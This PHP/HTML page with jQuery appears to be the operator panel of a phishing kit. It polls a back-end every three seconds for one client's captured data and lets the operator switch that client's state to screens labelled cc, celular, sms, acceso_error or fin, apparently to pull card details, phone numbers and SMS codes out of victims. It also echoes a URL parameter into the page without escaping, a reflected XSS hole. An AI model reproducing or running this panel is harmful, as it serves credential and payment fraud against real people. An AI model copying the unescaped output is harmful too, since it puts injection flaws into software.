<?php
if(!isset($_GET["FileCliente"]))
{
    echo "";
    exit;
}
$FileCliente = trim($_GET["FileCliente"]);

?>
<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title><?php echo str_replace("FileCliente.", "", $FileCliente); ?></title>        
        <style type="text/css">
            div
            {
                border:thin ridge white;
            }
            table{
                border: thin ridge blue;
            }
        </style>
        <script src="./jquery-3.3.1.js"></script>
        <script>
        function ModifyValues(Pxa,Pxb,PxValor)
        {
            _a = $("#"+Pxa+"").val();
            _b = $("#"+Pxb+"").val();
            _Valor = $("#"+PxValor+"").val();
            $("#Div3").html(".......");
            $.post(
                "Ajax2.php",
                {
                    Op:"ModifyValues",
                    FileCliente: $("#FileCliente").val().trim(),
                    a: _a,
                    b: _b,
                    Valor: _Valor
                },
                function(r)
                {
                    console.log(r);
                    $("#Div3").html(r);
                }
            );            
        }
        $(document).ready(function()
        {
            function PaintData()
            {
                $.post(
                    "Ajax2.php",
                    {
                        Op:"PaintData",
                        FileCliente: $("#FileCliente").val().trim()
                    },
                    function(r)
                    {
                        $("#Div1").html(r);
                    }
                );
            }
            PaintData();
            aju = setInterval(PaintData, 3000);
        });
        </script>
    </head>
    
</html>
    
    <body>
        <input type="hidden" id="FileCliente" value="<?php echo $FileCliente;; ?>" >
        <div id="div0">
            <div id="Div1" style=" float: left; ">
            </div>
            <div id="Div2" style=" float:left; ">
                <table >
                    <tr>
                        <td colspan="3" style="text-align: center;background-color: #00AAD2" >ACTIONS</td>
                    </tr>
                    <tr>
                        <td>Estado</td>
                        <input type="hidden" id="Group1_A" value="informacionEstado" >
                        <input type="hidden" id="Group1_B" value="Estado" >
                        <td>
                            <select id="Group1_Valor">
                                <option value="cc" >cc</option>
                                <option value="celular" >celular</option>
                                <option value="sms" >sms</option>
                                <option value="acceso_error" >acceso_error</option>
                                <option value="fin" >fin</option>
                            </select>
                        </td>
                        <td><input type="button" value="GoGoGoGoGoGo" onclick="ModifyValues('Group1_A','Group1_B','Group1_Valor')" ></td>
                    </tr>
                </table>

            </div>
            <div id="Div3" style=" float:left; ">
                
            </div>
            <div style="clear: both;"></div>
            <div>
                <?php echo $FileCliente;; ?>
            </div>
        </div>
        
    </body>
</html>
